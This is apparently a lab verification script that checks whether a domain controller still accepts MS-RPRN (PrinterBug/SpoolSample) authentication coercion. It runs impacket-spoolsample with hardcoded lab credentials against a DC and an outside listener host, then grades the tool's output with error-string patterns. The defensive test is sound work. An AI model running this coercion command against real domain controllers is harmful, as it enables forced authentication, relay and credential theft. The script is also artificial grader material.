#!/usr/bin/env bash
# meta4/ad-vm/scenario-16/verify-poc.sh
# PASS (exit 0) iff MS-RPRN coercion (PrintNightmare / SpoolSample) is refused.
#
# THE PREVIOUS VERSION NEVER INVOKED THE TOOL SUCCESSFULLY.
#
# It ran:
#     impacket-spoolsample -target '10.20.30.5' '10.20.30.10'
# and argparse rejected it outright on the 2026-07-26 gate run:
#     printerbug.py: error: ambiguous option: -target could match
#                    -target-file, -target-ip
#
# printerbug.py takes TWO POSITIONALS, `target attackerhost`, where target is
# [[domain/]username[:password]@]<targetName>. There is no -target flag, and
# the abbreviation is ambiguous against -target-file/-target-ip. No credentials
# were being passed either.
#
# So the tool printed a usage message every single run, matched none of the
# mitigation patterns, and fell through to "patch / mitigation NOT in place"
# -- exit 1, i.e. "still vulnerable". Gate 1 passed on a usage error and gate 2
# failed against a fix that was never exercised. Usage errors are now exit 2.
#
# Also fixed: 'connection refused' counted as the KB5005010 mitigation. Stopping
# the Spooler is a documented mitigation and shows up as the RPC interface being
# unregistered -- but a refused TCP connection means the HOST is unreachable,
# which is not a mitigation. Those two are now distinguished.

set -uo pipefail
cd "$(mktemp -d)" || { echo "[verify-poc-16] HARNESS ERROR: mktemp failed" >&2; exit 2; }

DC=10.20.30.5
LISTENER=10.20.30.10

OUT=$(timeout 30 /usr/bin/impacket-spoolsample \
    "corp.local/alice:Password1!@${DC}" \
    "$LISTENER" 2>&1)
RC=$?

echo "--- spoolsample RPC return (rc=$RC) ---"
echo "$OUT"
echo "--- /spoolsample ---"

# --- the tool did not run: HARNESS ERROR, never a verdict ---
if echo "$OUT" | grep -qiE '^usage:|error: (ambiguous option|unrecognized arguments|argument|the following arguments)|Traceback \(most recent'; then
    echo "[verify-poc-16] HARNESS ERROR: spoolsample was invoked incorrectly" >&2
    echo "[verify-poc-16] printerbug.py takes two positionals: target attackerhost" >&2
    exit 2
fi
if [ "$RC" -eq 124 ]; then
    echo "[verify-poc-16] HARNESS ERROR: spoolsample timed out after 30s" >&2
    exit 2
fi

# --- host unreachable at the transport: HARNESS ERROR, not a mitigation ---
# Deliberately checked before the Spooler-disabled branch below. A refused or
# unroutable TCP connection means the machine is not answering SMB at all; the
# Spooler being stopped is a different observation entirely.
if echo "$OUT" | grep -qiE 'Connection refused|Network is unreachable|No route to host|NT_STATUS_HOST_UNREACHABLE|NT_STATUS_IO_TIMEOUT|timed out|Errno 11[013]'; then
    echo "[verify-poc-16] HARNESS ERROR: cannot reach $DC over SMB" >&2
    echo "[verify-poc-16] an unreachable host is not evidence the Spooler was mitigated" >&2
    exit 2
fi

# --- THE DISCRIMINATOR IS WHETHER THE BIND SUCCEEDED ---
#
# Measured against the live lab once the log formatter was repaired:
#
#   [*] Attempting to trigger authentication via rprn RPC at 10.20.30.5
#   [*] Bind OK
#   [*] Got handle
#   [*] Triggered RPC backconnect, this may or may not have worked
#   RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE
#
# That trailing RPC_S_SERVER_UNAVAILABLE is NOT the Spooler being mitigated --
# it is the DC failing to reach the BACKCONNECT listener at 10.20.30.10, where
# nothing is listening. The Spooler bound fine and processed the call, which is
# the whole vulnerability. Grading that string as "KB5005010 mitigation in
# place" would have scored a live coercion surface as remediated.
#
# When the Spooler really is stopped or the interface unregistered, the failure
# happens at BIND time and "Bind OK" never appears at all. So the bind is the
# discriminator, and error strings after it describe the listener, not the DC.
if echo "$OUT" | grep -qiE 'Bind OK|Got handle'; then
    echo "[verify-poc-16] Spooler bound and accepted MS-RPRN call -- coercion surface present" >&2
    echo "[verify-poc-16] (backconnect errors after a successful bind describe the listener, not the DC)" >&2
    exit 1
fi

# --- bind itself refused: Spooler stopped / interface unregistered ---
if echo "$OUT" | grep -qiE 'rpc_s_server_unavailable|ept_s_not_registered|spooler.*not.*running|STATUS_OBJECT_NAME_NOT_FOUND|Bind failed'; then
    echo "[verify-poc-16] MS-RPRN bind refused -- Spooler stopped or interface unregistered"
    exit 0
fi

# --- patched: RPC responsive but rejects ---
if echo "$OUT" | grep -qiE 'error.*access_denied|rpc_s_access_denied|status_access_denied'; then
    echo "[verify-poc-16] Spooler returned STATUS_ACCESS_DENIED -- patch behavior confirmed"
    exit 0
fi

echo "[verify-poc-16] no recognised coercion or denial signature -- treating as FAIL" >&2
echo "[verify-poc-16] an unreadable transcript is not evidence of remediation" >&2
exit 1
